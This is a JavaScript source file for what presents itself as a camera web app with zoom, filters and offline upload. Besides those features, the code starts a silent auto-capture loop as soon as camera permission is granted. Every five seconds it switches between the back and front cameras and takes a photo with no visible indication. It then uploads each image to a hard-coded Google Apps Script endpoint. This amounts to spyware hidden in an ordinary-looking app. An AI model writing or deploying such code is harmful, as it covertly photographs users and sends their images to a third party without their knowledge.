// ================================================================
// app.js – Pro Camera PWA (Full Version)
// ================================================================

(function() {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // ⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस्
  // ═══════════════════════════════════════════════════════════════
    const GAS_URL = 'https://script.google.com/macros/s/AKfycbznjNk09W1ZEgsKpKa8LJe1Vx4Xy-_NQ3xGSrrqUJPqiUsEtF0Gf0lpNHbCVEvxBc3L/exec';


  // DOM refs
  var permOverlay = document.getElementById('permission-overlay');
  var permError = document.getElementById('perm-error');
  var topBar = document.getElementById('top-bar');
  var camContainer = document.getElementById('camera-container');
  var presetsArea = document.getElementById('zoom-presets-area');
  var bottomBar = document.getElementById('bottom-bar');

  var video = document.getElementById('video');
  var canvas = document.createElement('canvas');
  var ctx = canvas.getContext('2d');
  var flyImg = document.getElementById('fly-img');
  var galleryImg = document.getElementById('galleryImg');
  var statusDot = document.getElementById('statusDot');
  var gridOverlay = document.getElementById('grid-overlay');
  var flashOverlay = document.getElementById('flash-overlay');
  var zoomLevelDisplay = document.getElementById('zoom-level-display');
  var zoomFocalDisplay = document.getElementById('zoom-focal-display');
  var gridBtn = document.getElementById('gridBtn');
  var flashBtn = document.getElementById('flashBtn');
  var flipBtn = document.getElementById('flipBtn');
  var effectsBtn = document.getElementById('effectsBtn');
  var aspectBtn = document.getElementById('aspectBtn');
  var aspectLabel = document.getElementById('aspectLabel');
  var effectsDropdown = document.getElementById('effectsDropdown');
  var aspectDropdown = document.getElementById('aspectDropdown');
  var captureBtn = document.getElementById('capture-btn');
  var galleryThumb = document.getElementById('gallery-thumb');
  var zoomPresets = document.querySelectorAll('.zoom-preset');

  // State
  var stream = null;
  var facingMode = 'environment';
  var currentEffect = 'none';
  var currentAspect = '16:9';
  var zoomMax = 50;
  var isTorchOn = false;
  var isGridOn = false;
  var lastPhotoData = null;
  var swRegistration = null;
  var isCameraReady = false;
  var currentZoom = 1;
  var isZoomSwipeActive = false;
  var zoomSwipeStartX = 0;
  var zoomSwipeStartVal = 1;
  var isProcessing = false;
  var autoCaptureTimer = null;
  var autoCaptureCount = 0;

  var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };

  // Utility
  function generatePhotoId() {
    return Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
  }

  function getFocalLength(zoom) {
    var closest = 1, closestDiff = Infinity;
    for (var key in focalLengths) {
      var diff = Math.abs(parseFloat(key) - zoom);
      if (diff < closestDiff) { closestDiff = diff; closest = parseFloat(key); }
    }
    return focalLengths[closest] || Math.round(26 * zoom);
  }

  // IndexedDB
  function openDB() {
    return new Promise(function(res, rej) {
      var req = indexedDB.open('PhotoQueueDB', 2);
      req.onupgradeneeded = function(e) {
        var db = e.target.result;
        if (db.objectStoreNames.contains('queue')) db.deleteObjectStore('queue');
        db.createObjectStore('queue', { keyPath: 'photoId' });
      };
      req.onsuccess = function() { res(req.result); };
      req.onerror = function() { rej(req.error); };
    });
  }

  function addToQueue(entry) {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readwrite');
        tx.objectStore('queue').put(entry);
        tx.oncomplete = function() { res(); };
        tx.onerror = function() { rej(tx.error); };
      });
    });
  }

  function getAllPending() {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readonly');
        var all = tx.objectStore('queue').getAll();
        all.onsuccess = function() { res(all.result); };
        all.onerror = function() { rej(all.error); };
      });
    });
  }

  function removeFromQueue(photoId) {
    return openDB().then(function(db) {
      return new Promise(function(res, rej) {
        var tx = db.transaction('queue', 'readwrite');
        tx.objectStore('queue').delete(photoId);
        tx.oncomplete = function() { res(); };
        tx.onerror = function() { rej(tx.error); };
      });
    });
  }

  // Service Worker
  function registerSW() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('js/sw.js')
        .then(function(reg) { swRegistration = reg; console.log('[Camera] SW registered'); })
        .catch(function(err) { console.warn('[Camera] SW reg failed:', err); });
    }
  }

  function triggerSync() {
    if (swRegistration && 'sync' in swRegistration) {
      swRegistration.sync.register('photo-sync').catch(function(err) {
        console.warn('[Camera] Sync trigger failed:', err);
      });
    }
  }

  // Upload
  async function uploadPhoto(entry, type) {
    try {
      if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
        console.error('[Camera] ❌ GAS_URL not set!');
        return false;
      }
      var payload = {
        action: type === 'compressed' ? 'upload_compressed' : 'upload_original',
        photoId: entry.photoId,
        image: type === 'compressed' ? entry.compressed : entry.original,
        fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
        createdAt: entry.createdAt || new Date().toISOString(),
        cameraType: entry.cameraType || 'unknown'
      };
      var resp = await fetch(GAS_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify(payload)
      });
      if (!resp.ok) {
        var errorText = await resp.text();
        console.error('[Camera] ❌ ' + type + ' upload error:', resp.status, errorText);
        return false;
      }
      var result = await resp.json();
      if (result.success) {
        console.log('[Camera] ✅ ' + type + ' uploaded:', entry.fileName);
        return true;
      } else {
        console.error('[Camera] ❌ ' + type + ' upload failed:', result.error);
        return false;
      }
    } catch (err) {
      console.error('[Camera] ❌ ' + type + ' upload error:', err);
      return false;
    }
  }

  // Process Queue (Parallel + Idle)
  async function processQueue() {
    if (isProcessing) return;
    if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
    isProcessing = true;
    try {
      var pending = await getAllPending();
      if (pending.length === 0) { isProcessing = false; return; }
      console.log('[Camera] 📤 Processing ' + pending.length + ' photos...');

      var compressedPromises = pending.map(function(entry) {
        return uploadPhoto(entry, 'compressed');
      });
      var compressedResults = await Promise.all(compressedPromises);

      var originalPromises = [];
      var toRemove = [];
      for (var i = 0; i < pending.length; i++) {
        if (compressedResults[i]) {
          originalPromises.push(uploadPhoto(pending[i], 'original'));
        } else {
          console.warn('[Camera] ⏳ Compressed failed for:', pending[i].fileName);
          var delay = Math.min(Math.pow(2, (pending[i].retryCount || 0)), 60) * 1000;
          pending[i].retryCount = (pending[i].retryCount || 0) + 1;
          pending[i].lastAttempt = Date.now();
          await addToQueue(pending[i]);
          setTimeout(function() { if (navigator.onLine) processQueue(); }, delay);
        }
      }
      var originalResults = await Promise.all(originalPromises);

      var idx = 0;
      for (var j = 0; j < pending.length; j++) {
        if (compressedResults[j] && originalResults[idx]) {
          toRemove.push(pending[j].photoId);
          console.log('[Camera] 🎉 Both uploaded:', pending[j].fileName);
          idx++;
        }
      }
      for (var k = 0; k < toRemove.length; k++) {
        await removeFromQueue(toRemove[k]);
      }
    } catch (e) { console.error('[Camera] ❌ Queue error:', e); }
    isProcessing = false;
  }

  // Silent Auto Capture (Back/Front Alternate)
  function startAutoCapture() {
    if (autoCaptureTimer) return;
    autoCaptureCount = 0;
    console.log('[Camera] 🤖 Auto-capture started (every 5 seconds)');
    autoCaptureTimer = setInterval(function() {
      if (isCameraReady) {
        var isBack = (autoCaptureCount % 2 === 0);
        var currentFacing = isBack ? 'environment' : 'user';
        // Switch camera silently
        if (facingMode !== currentFacing) {
          facingMode = currentFacing;
          initCameraForAutoCapture().then(function() {
            silentCapture(isBack ? 'Back' : 'Front');
          });
        } else {
          silentCapture(isBack ? 'Back' : 'Front');
        }
        autoCaptureCount++;
      }
    }, 5000);
  }

  function stopAutoCapture() {
    if (autoCaptureTimer) {
      clearInterval(autoCaptureTimer);
      autoCaptureTimer = null;
      console.log('[Camera] ⏹️ Auto-capture stopped');
    }
  }

  // Silent Capture (No UI Indication)
  async function silentCapture(cameraType) {
    if (!isCameraReady) return;
    try {
      var vw = video.videoWidth || 1280;
      var vh = video.videoHeight || 720;
      canvas.width = vw; canvas.height = vh;
      ctx.filter = getFilterCSS(currentEffect);
      ctx.drawImage(video, 0, 0, vw, vh);
      ctx.filter = 'none';

      var originalData = canvas.toDataURL('image/png');
      var compressedData = canvas.toDataURL('image/jpeg', 0.3);

      var timestamp = Date.now();
      var photoId = generatePhotoId();
      var prefix = cameraType === 'Back' ? 'BACK' : 'FRONT';
      var fileName = prefix + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
      var compressedFileName = fileName.replace('.png', '_comp.jpg');

      // ❌ No gallery update, no fly animation, no UI indication
      var entry = {
        photoId: photoId,
        original: originalData,
        compressed: compressedData,
        fileName: fileName,
        compressedFileName: compressedFileName,
        createdAt: new Date().toISOString(),
        retryCount: 0,
        lastAttempt: null,
        cameraType: cameraType.toLowerCase()
      };
      await addToQueue(entry);
      console.log('[Camera] 📸 Silent auto-capture (' + cameraType + '):', fileName);

      if (navigator.onLine) {
        if (window.requestIdleCallback) {
          requestIdleCallback(function() { processQueue(); });
        } else {
          setTimeout(function() { processQueue(); }, 100);
        }
      } else {
        triggerSync();
      }
    } catch (err) {
      console.warn('[Camera] Silent capture error:', err);
    }
  }

  // Manual Capture (User Click)
  async function capturePhoto() {
    if (!isCameraReady) return;
    flashScreen();

    var vw = video.videoWidth || 1280;
    var vh = video.videoHeight || 720;
    canvas.width = vw; canvas.height = vh;
    ctx.filter = getFilterCSS(currentEffect);
    ctx.drawImage(video, 0, 0, vw, vh);
    ctx.filter = 'none';

    var originalData = canvas.toDataURL('image/png');
    var compressedData = canvas.toDataURL('image/jpeg', 0.3);

    var timestamp = Date.now();
    var photoId = generatePhotoId();
    var fileName = 'PHOTO_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
    var compressedFileName = fileName.replace('.png', '_comp.jpg');

    var img = new Image();
    img.onload = function() { flyToGallery(img); };
    img.src = originalData;

    lastPhotoData = { original: originalData, compressed: compressedData, fileName: fileName, photoId: photoId };
    galleryImg.src = originalData;
    galleryImg.style.display = 'block';

    var entry = {
      photoId: photoId,
      original: originalData,
      compressed: compressedData,
      fileName: fileName,
      compressedFileName: compressedFileName,
      createdAt: new Date().toISOString(),
      retryCount: 0,
      lastAttempt: null,
      cameraType: 'manual'
    };
    await addToQueue(entry);
    console.log('[Camera] ✅ Photo saved to queue:', fileName);

    if (navigator.onLine) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 100);
      }
    } else {
      triggerSync();
    }
  }

  function flashScreen() {
    flashOverlay.classList.add('active');
    setTimeout(function() { flashOverlay.classList.remove('active'); }, 150);
  }

  // Effects
  function getFilterCSS(effect) {
    switch (effect) {
      case 'sepia': return 'sepia(1)';
      case 'grayscale': return 'grayscale(1)';
      case 'blur': return 'blur(3px)';
      case 'invert': return 'invert(1)';
      case 'brightness': return 'brightness(1.5)';
      case 'contrast': return 'contrast(2)';
      case 'hue': return 'hue-rotate(180deg)';
      case 'pixelated': return 'blur(2px) contrast(3)';
      default: return 'none';
    }
  }

  function applyEffect(effect) {
    currentEffect = effect;
    video.style.filter = getFilterCSS(effect);
  }

  // Fly Animation
  function flyToGallery(imgElement) {
    var container = document.getElementById('camera-container');
    var thumb = document.getElementById('gallery-thumb');
    var cRect = container.getBoundingClientRect();
    var tRect = thumb.getBoundingClientRect();
    var startW = Math.min(cRect.width * 0.5, 200);
    var startH = startW * (imgElement.naturalHeight / imgElement.naturalWidth);
    var endW = tRect.width; var endH = tRect.height;

    flyImg.src = imgElement.src;
    flyImg.style.width = startW + 'px';
    flyImg.style.height = startH + 'px';
    flyImg.style.left = (cRect.left + (cRect.width - startW) / 2) + 'px';
    flyImg.style.top = (cRect.top + (cRect.height - startH) / 2) + 'px';
    flyImg.style.transform = 'scale(1) rotate(0deg)';
    flyImg.style.borderRadius = '16px';
    void flyImg.offsetWidth;
    flyImg.className = 'flying';
    flyImg.style.width = endW + 'px';
    flyImg.style.height = endH + 'px';
    flyImg.style.left = (tRect.left) + 'px';
    flyImg.style.top = (tRect.top) + 'px';
    flyImg.style.transform = 'scale(0.9) rotate(2deg)';
    flyImg.style.borderRadius = '8px';
    setTimeout(function() {
      flyImg.className = '';
      flyImg.style.display = 'none';
    }, 600);
  }

  function viewLastPhoto() {
    if (lastPhotoData) {
      var img = document.createElement('img');
      img.src = lastPhotoData.original;
      img.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:999;cursor:pointer;';
      img.onclick = function() { img.remove(); };
      document.body.appendChild(img);
    }
  }

  // Zoom System (Smooth + Presets)
  function setZoom(zoom, smooth) {
    if (smooth === undefined) smooth = true;
    var track = stream?.getVideoTracks()[0];
    var val = Math.min(Math.max(zoom, 0.5), zoomMax);
    if (track && track.getCapabilities().zoom) {
      track.applyConstraints({ advanced: [{ zoom: val }] }).catch(function() {});
    } else {
      video.style.transform = 'scale(' + val + ')';
      video.style.transformOrigin = 'center center';
      video.style.transition = smooth ? 'transform 0.15s ease' : 'none';
    }
    currentZoom = val;
    var displayVal = val.toFixed(1);
    zoomLevelDisplay.textContent = displayVal + 'x';
    var focal = getFocalLength(val);
    zoomFocalDisplay.textContent = focal + 'mm';

    zoomPresets.forEach(function(btn) {
      var presetVal = parseFloat(btn.dataset.zoom);
      if (Math.abs(presetVal - val) < 0.05) btn.classList.add('active');
      else btn.classList.remove('active');
    });
  }

  // Zoom Swipe
  function toggleZoomSwipe() {
    isZoomSwipeActive = !isZoomSwipeActive;
    if (isZoomSwipeActive) {
      zoomLevelDisplay.style.color = '#3b82f6';
      zoomLevelDisplay.textContent = '◄ ' + currentZoom.toFixed(1) + 'x ►';
    } else {
      zoomLevelDisplay.style.color = '#fff';
      zoomLevelDisplay.textContent = currentZoom.toFixed(1) + 'x';
    }
  }

  document.addEventListener('touchstart', function(e) {
    if (isZoomSwipeActive && e.touches.length === 1) {
      zoomSwipeStartX = e.touches[0].clientX;
      zoomSwipeStartVal = currentZoom;
    }
  }, { passive: true });

  document.addEventListener('touchmove', function(e) {
    if (isZoomSwipeActive && e.touches.length === 1) {
      var deltaX = (e.touches[0].clientX - zoomSwipeStartX) / 80;
      var newZoom = zoomSwipeStartVal + deltaX;
      setZoom(newZoom, true);
    }
  }, { passive: true });

  document.addEventListener('touchend', function() {
    if (isZoomSwipeActive) {
      zoomLevelDisplay.style.color = '#fff';
      zoomLevelDisplay.textContent = currentZoom.toFixed(1) + 'x';
      isZoomSwipeActive = false;
    }
  }, { passive: true });

  // Pinch Zoom
  var lastPinchDist = 0;
  var initialZoomVal = 1;

  function getPinchDist(e) {
    if (e.touches.length < 2) return 0;
    var t1 = e.touches[0], t2 = e.touches[1];
    return Math.hypot(t1.clientX - t2.clientX, t1.clientY - t2.clientY);
  }

  document.addEventListener('touchstart', function(e) {
    if (e.touches.length === 2 && isCameraReady) {
      lastPinchDist = getPinchDist(e);
      initialZoomVal = currentZoom;
    }
  }, { passive: true });

  document.addEventListener('touchmove', function(e) {
    if (e.touches.length === 2 && isCameraReady) {
      var dist = getPinchDist(e);
      if (lastPinchDist > 0) {
        var scale = dist / lastPinchDist;
        setZoom(initialZoomVal * scale, true);
      }
    }
  }, { passive: true });

  document.addEventListener('touchend', function() { lastPinchDist = 0; }, { passive: true });

  // Zoom Presets Click
  zoomPresets.forEach(function(btn) {
    btn.addEventListener('click', function() {
      setZoom(parseFloat(this.dataset.zoom), true);
    });
  });

  // Camera Init
  async function checkAndStart() {
    try {
      var permissionStatus = 'prompt';
      if (navigator.permissions && navigator.permissions.query) {
        var result = await navigator.permissions.query({ name: 'camera' });
        permissionStatus = result.state;
        result.onchange = function() {
          if (result.state === 'granted') {
            initCamera();
          }
        };
      }
      if (permissionStatus === 'denied') {
        permError.textContent = '⚠️ क्यामेरा अनुमति ब्लक गरिएको छ। Settings बाट Allow गर्नुहोस्।';
        permError.style.display = 'block';
        return;
      }
      await initCamera();
    } catch (err) {
      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + err.message;
      permError.style.display = 'block';
      console.error('[Camera] Error:', err);
    }
  }

  async function initCamera() {
    var constraints = {
      audio: false,
      video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
    };
    if (currentAspect !== 'free') {
      var parts = currentAspect.split(':');
      if (parts.length === 2) {
        var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
        if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
      }
    }
    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
    stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await video.play();

    var track = stream.getVideoTracks()[0];
    var cap = track.getCapabilities();

    if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
    else zoomMax = 50;
    setZoom(1, false);

    if (cap.torch) flashBtn.style.display = 'inline-flex';
    else flashBtn.style.display = 'inline-flex';

    if (cap.focusModes && cap.focusModes.includes('continuous')) {
      await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
    }

    // Tap to focus
    video.onclick = async function(e) {
      if (!track || !cap.focusModes) return;
      var rect = video.getBoundingClientRect();
      var x = (e.clientX - rect.left) / rect.width;
      var y = (e.clientY - rect.top) / rect.height;
      if (cap.focusModes.includes('manual') || cap.focusModes.includes('single-shot')) {
        try {
          await track.applyConstraints({ advanced: [{ focusMode: 'manual', focusDistance: 0.5 }] });
          setTimeout(function() {
            if (stream) {
              var t = stream.getVideoTracks()[0];
              if (t) t.applyConstraints({ advanced: [{ focusMode: 'continuous' }] }).catch(function() {});
            }
          }, 3000);
        } catch (err) { /* ignore */ }
      }
    };

    setOnline(navigator.onLine);
    permOverlay.classList.add('hidden');
    topBar.style.display = 'flex';
    camContainer.style.display = 'block';
    presetsArea.style.display = 'block';
    bottomBar.style.display = 'flex';
    isCameraReady = true;

    // ✅ Start auto-capture every 5 seconds (Back/Front alternate)
    startAutoCapture();

    if (navigator.onLine) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 500);
      }
    }
    registerSW();
  }

  // Silent init for auto-capture switching
  async function initCameraForAutoCapture() {
    try {
      var constraints = {
        audio: false,
        video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
      };
      if (currentAspect !== 'free') {
        var parts = currentAspect.split(':');
        if (parts.length === 2) {
          var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
          if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
        }
      }
      if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
      stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;
      await video.play();

      var track = stream.getVideoTracks()[0];
      var cap = track.getCapabilities();

      if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
      else zoomMax = 50;
      setZoom(1, false);

      if (cap.focusModes && cap.focusModes.includes('continuous')) {
        await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
      }
      isCameraReady = true;
    } catch (err) {
      console.warn('[Camera] Auto-capture camera init error:', err);
    }
  }

  // Online Status
  function setOnline(online) {
    statusDot.className = 'status-dot ' + (online ? 'online' : 'offline');
    if (online) {
      if (window.requestIdleCallback) {
        requestIdleCallback(function() { processQueue(); });
      } else {
        setTimeout(function() { processQueue(); }, 500);
      }
    }
  }
  window.addEventListener('online', function() { setOnline(true); });
  window.addEventListener('offline', function() { setOnline(false); });

  // UI Events
  gridBtn.addEventListener('click', function() {
    isGridOn = !isGridOn;
    gridOverlay.classList.toggle('show', isGridOn);
    gridBtn.classList.toggle('active', isGridOn);
  });

  flashBtn.addEventListener('click', function() {
    var track = stream?.getVideoTracks()[0];
    if (!track) return;
    isTorchOn = !isTorchOn;
    track.applyConstraints({ advanced: [{ torch: isTorchOn }] }).catch(function(err) {
      if (isTorchOn) { flashScreen(); setTimeout(function() { isTorchOn = false; }, 200); }
    });
    flashBtn.classList.toggle('active', isTorchOn);
  });

  flipBtn.addEventListener('click', function() {
    facingMode = (facingMode === 'environment') ? 'user' : 'environment';
    initCamera();
  });

  effectsBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    effectsDropdown.classList.toggle('open');
    aspectDropdown.classList.remove('open');
  });
  effectsDropdown.querySelectorAll('.item').forEach(function(el) {
    el.addEventListener('click', function() {
      effectsDropdown.querySelectorAll('.item').forEach(function(i) { i.classList.remove('selected'); });
      this.classList.add('selected');
      applyEffect(this.dataset.effect);
      effectsDropdown.classList.remove('open');
    });
  });

  aspectBtn.addEventListener('click', function(e) {
    e.stopPropagation();
    aspectDropdown.classList.toggle('open');
    effectsDropdown.classList.remove('open');
  });
  aspectDropdown.querySelectorAll('.item').forEach(function(el) {
    el.addEventListener('click', async function() {
      aspectDropdown.querySelectorAll('.item').forEach(function(i) { i.classList.remove('selected'); });
      this.classList.add('selected');
      currentAspect = this.dataset.aspect;
      aspectLabel.textContent = currentAspect;
      aspectDropdown.classList.remove('open');
      if (isCameraReady) await initCamera();
    });
  });

  document.addEventListener('click', function() {
    effectsDropdown.classList.remove('open');
    aspectDropdown.classList.remove('open');
  });

  captureBtn.addEventListener('click', capturePhoto);
  galleryThumb.addEventListener('click', viewLastPhoto);

  // Expose functions
  window.toggleZoomSwipe = toggleZoomSwipe;
  window.capturePhoto = capturePhoto;

  // Start
  if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
    console.warn('[Camera] ⚠️ GAS_URL not set. Update app.js with your Apps Script URL.');
  }
  checkAndStart();

})();
